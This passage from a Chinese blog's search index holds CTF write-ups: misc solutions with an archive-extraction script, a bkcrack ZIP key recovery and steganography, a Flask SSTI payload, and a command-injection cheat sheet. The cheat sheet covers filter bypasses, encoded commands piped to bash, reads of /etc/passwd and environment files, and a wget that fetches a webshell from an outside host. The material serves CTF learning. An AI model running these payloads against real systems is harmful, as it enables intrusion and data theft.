-    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
-        zip_ref.extractall(extract_dir)
-        return zip_ref.namelist()  # 返回解压出来的文件列表
-
-
-def extract_tar(tar_path, extract_dir):
-    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
-    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
-        tar_ref.extractall(extract_dir)
-        return tar_ref.getnames()  # 返回解压出来的文件列表
-
-
-def extract_7z(archive_path, extract_dir):
-    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
-    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
-        archive_ref.extractall(extract_dir)
-        return archive_ref.getnames()  # 返回解压出来的文件列表
-
-
-def handle_compressed_file(file_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
-    if file_path.endswith(&#x27;.zip&#x27;):
-        extracted_files = extract_zip(file_path, extract_dir)
-    elif file_path.endswith(&#x27;.tar&#x27;):
-        extracted_files = extract_tar(file_path, extract_dir)
-    elif file_path.endswith(&#x27;.7z&#x27;):
-        extracted_files = extract_7z(file_path, extract_dir)
-    else:
-        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
-        return []
-
-    # 记录去掉后缀并连接的文件名
-    with open(output_txt, &#x27;a&#x27;) as output_file:
-        for file_name in extracted_files:
-            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
-            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)
-
-    return extracted_files
-
-
-def process_zip(zip_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
-    # 解压当前zip文件并返回解压后的文件列表
-    extracted_files = extract_zip(zip_path, extract_dir)
-
-    for extracted_file in extracted_files:
-        extracted_file_path = os.path.join(extract_dir, extracted_file)
-
-        if os.path.isdir(extracted_file_path):
-            continue  # 跳过目录
-
-        # 如果解压出来的是压缩包，再进行递归处理
-        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
-            # 解压嵌套压缩包并处理
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-            # 如果是嵌套的压缩包，再递归调用
-            if extracted_file.endswith(&#x27;.zip&#x27;):
-                process_zip(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.tar&#x27;):
-                process_tar(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.7z&#x27;):
-                process_7z(extracted_file_path, extract_dir, output_txt)
-
-        else:
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-
-    # 删除当前处理的压缩包
-    if zip_path.endswith(&#x27;.zip&#x27;):
-        os.remove(zip_path)
-
-
-def process_tar(tar_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
-    extracted_files = extract_tar(tar_path, extract_dir)
-    for extracted_file in extracted_files:
-        extracted_file_path = os.path.join(extract_dir, extracted_file)
-
-        if os.path.isdir(extracted_file_path):
-            continue
-
-        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-            if extracted_file.endswith(&#x27;.zip&#x27;):
-                process_zip(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.tar&#x27;):
-                process_tar(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.7z&#x27;):
-                process_7z(extracted_file_path, extract_dir, output_txt)
-
-    # 删除当前处理的压缩包
-    if tar_path.endswith(&#x27;.tar&#x27;):
-        os.remove(tar_path)
-
-
-def process_7z(archive_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
-    extracted_files = extract_7z(archive_path, extract_dir)
-    for extracted_file in extracted_files:
-        extracted_file_path = os.path.join(extract_dir, extracted_file)
-
-        if os.path.isdir(extracted_file_path):
-            continue
-
-        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-            if extracted_file.endswith(&#x27;.zip&#x27;):
-                process_zip(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.tar&#x27;):
-                process_tar(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.7z&#x27;):
-                process_7z(extracted_file_path, extract_dir, output_txt)
-
-    # 删除当前处理的压缩包
-    if archive_path.endswith(&#x27;.7z&#x27;):
-        os.remove(archive_path)
-
-
-def main():
-    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
-    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
-    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
-
-    if not os.path.exists(extract_dir):
-        os.makedirs(extract_dir)
-
-    # 开始处理压缩包
-    with open(output_txt, &#x27;w&#x27;) as output_file:
-        output_file.write(&quot;&quot;)
-    process_zip(zip_path, extract_dir, output_txt)
-
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre>
-
-<p>再对提出来的文件名做两种处理</p>
-<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
-    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
-    with open(input_txt, &#x27;r&#x27;) as infile:
-        file_names = infile.readlines()
-
-    # 去掉换行符并从后往前连接
-    reversed_file_names = [name.strip() for name in reversed(file_names)]
-
-    # 将连接后的文件名写入新文件
-    with open(output_txt, &#x27;w&#x27;) as outfile:
-        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
-        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
-def remove_newlines_and_connect(input_txt, output_txt):
-    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
-    with open(input_txt, &#x27;r&#x27;) as infile:
-        # 读取所有行并去掉换行符
-        file_names = infile.read().splitlines()
-
-    # 将文件名用空格连接
-    connected_file_names = &quot;&quot;.join(file_names)
-
-    # 将连接后的文件名写入新文件
-    with open(output_txt, &#x27;w&#x27;) as outfile:
-        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
-        outfile.write(connected_file_names)  # 直接写入连接后的字符串
-
-def main():
-    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
-    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
-    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
-    reverse_file_names(input_txt, output1_txt)
-    remove_newlines_and_connect(input_txt, output2_txt)
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre>
-
-<p>根据提示BASE58-Ripple、SM4-ECB</p>
-<p>先后尝试顺序的和逆序的</p>
-<p>最后逆序的得到以下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
-<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
-<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
-<p>在谷歌搜图后判断出是 DataMatrix码</p>
-<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
-<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
-<p>根据提示deepsound和弱口令</p>
-<p>试一下123？</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
-<p>运气比较好直接出来了</p>
-<p>提取zip后发现需要密码打开</p>
-<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
-<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
-<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
-bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
-
-<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
-<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>
-
-<p>得到flag.png</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
-<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
-<p>先试着打一下，看看有没有绕过</p>
-<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
-<p>直接爆了，那就ls换cat flag解决</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
-]]></content>
-      <tags>
-        <tag>-CTF -misc -WP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE</title>
-    <url>/2025/01/21/RCE/</url>
-    <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
-<p><strong>原理</strong></p>
-<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
-<p><strong>系统命令执行函数</strong></p>
-<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
-*** passthru() system()的平替，写个命令就会执行命令，自己能回显
-*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
-*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
-*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
-*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
-$command是要执行的命令。
-$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
-$pipes是一个引用变量，用于存储与进程相关的管道。
-$cwd（可选）是设置子进程的当前工作目录。
-$env（可选）是设置子进程的环境变量。
-$other_options（可选）是其他选项，如设置超时等
-不能直接回显
-*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
-path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
-envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>
-
-<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
-<p>那么就需要管道符来支持：</p>
-<p>*<strong>关于管道符</strong></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
-<p><strong>For Windows：</strong></p>
-<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
-<p><strong>For Linux:</strong></p>
-<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
-<p>发现漏洞后，如何得到控制权呢？</p>
-<p>最简单的漏洞就是找到注入点直接注</p>
-<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
-<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>
-
-<h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
-<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
-<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>
-
-<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
-<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>
-
-<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
-<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>
-
-<h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p>
-<p>%09绕过（相当于Tab键）</p>
-<p>%0a–代表换行符</p>
-<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
-<p>%0d–回车换行</p>
-<p>%a0–代表的是非断行空格</p>
-<p>%00–%00代表的是ASCII码中的空字符</p>
-<p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p>
-<p>内联注释绕过知识点</p>
-<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
-</code></pre>
-<h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
-<pre><code class="highlight plaintext">cat /fl??
-
-cat /f*  #多个匹配结果同时展现</code></pre>
-
-<p>以上指令等效于<code>cat /flag</code></p>
-<h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag
-
-c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>
-
-<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
-<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>
-
-<h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
-<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>
-
-<h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p>
-<pre><code class="highlight plaintext">cat /fl$9ag
-
-cat /fl$@ag</code></pre>
-
-<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
-<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd
-
-cat$x /etc$x/passwd$x
-
-ca$@t /etc$x/passwd$x</code></pre>
-
-<h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
-<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
-<h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p>
-<p>echo $PATH              #PATH默认系统环境变量</p>
-<p>如果出现：</p>
-<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>
-
-<p>则以下代码表示了flag.php</p>
-<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>
-
-<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
-<h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
-echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>
-
-<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
-<p>执行命令的话有三种形式：</p>
-<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash
-
-$(echo Y2FOIGZsYWcucGhw | base64 -d)
-
-`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>
-
-<p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
-<h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>
-
-<h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binascii
-s = b&quot;tac flag&quot;
-h = binascii.b2a_hex(s)
-print(h)</code></pre>
-
-<p>tac flag–&gt; 74616320666c6167</p>
-<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>
-
-<h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
-<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>
-
-<h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);
-
-?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);
-
-?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>
-
-<h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p>
-<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
-<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
-<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
-<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
-<p>别的指令也同理</p>
-<ul>
-<li><p>tac:反向显示，从最后一行开始往前显示</p>
-<pre><code class="highlight plaintext">tac /flag</code></pre>
-
-
-</li>
-<li><p>more:一页一页显示档案内容</p>
-<pre><code class="highlight plaintext">more flag.php</code></pre>
-
-
-</li>
-<li><p>less：与more类似</p>
-</li>
-<li><p>tail：查看末尾几行</p>
-</li>
-<li><p>nl：显示的时候，顺便输出行号</p>
-<pre><code class="highlight plaintext">nl /flag</code></pre></li>
-</ul>
-<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
-<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
-<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
-<ul>
-<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li>
-</ul>
-<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>
-
-<ul>
-<li><p>xxd：读取二进制文件</p>
-<pre><code class="highlight plaintext">xxd /flag</code></pre>
-
-
-</li>
-<li><p>sort：主要用于排序文件 </p>
-<pre><code class="highlight plaintext">so?t /flag
-/usr/bin/s?rt /flag</code></pre></li>
-</ul>
-<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
-<ul>
-<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
-<li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li>
-<li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li>
-</ul>
-<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
-<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
-<ul>
-<li>strings：<br>相当于cat</li>
-</ul>
-<h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p>
-<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
-<p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p>
-<p>3.利用cp命令：cp flag.php 1.txt</p>
-<p>4.利用mv命令：mv flag.php 1.txt</p>
-<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
-<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
-<p>7.利用wget下载：</p>
-<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>
-
-<p>8.dnslog外带数据</p>
-<h2 id="都是fakeflag-试试环境变量-proc-self-environ和env指令"><a href="#都是fakeflag-试试环境变量-proc-self-environ和env指令" class="headerlink" title="都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令"></a>都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</h2>]]></content>
-      <tags>
-        <tag>-Web -CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VNCTF2025</title>
-    <url>/2025/02/10/VNCTF2025/</url>
-    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
-<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
-<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
-<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p>
-<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
-<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
-<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
-<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
